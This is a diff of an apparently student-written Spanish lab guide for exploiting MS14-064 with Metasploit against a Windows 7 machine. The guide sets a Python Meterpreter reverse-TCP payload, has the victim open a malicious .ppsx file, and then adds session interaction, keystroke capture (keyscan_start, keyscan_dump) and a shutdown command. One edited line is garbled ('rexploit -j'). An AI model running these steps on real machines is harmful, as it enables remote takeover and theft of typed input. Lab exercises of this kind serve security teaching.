@@ -11,7 +11,7 @@ Windows 8.1
 Windows RT
 Windows RT 8.1
 
-Link del video: https://www.dropbox.com/s/is9pdjhpx7rsp54/Video_1552603800.wmv?dl=0
+Link del video: https://www.dropbox.com/s/a9lr9ooxpz7438r/Parcial.wmv?dl=0
 Captura del trafico por wireshark: Fotos Añadidas
 
 Instructivo para hacer el exploit:
@@ -60,10 +60,18 @@ exploit -j
 ir a window 7 y abrir el archivo MS14-064.ppsx
 
 set PAYLOAD python/meterpreter/reverse_tcp
-r
-exploit -j
+
+rexploit -j
 
 ir a window 7 y ejecutar archivo MS14-064_py.ppsx
+En kali: ejecutar sessions
+Mirar las sesiones activas
+sessions -i 1 (id de la sesion) // Para iniciar la interaccion 
+keyscan_start
+keyscan_dump
+shutdown
+
+
 
 
 
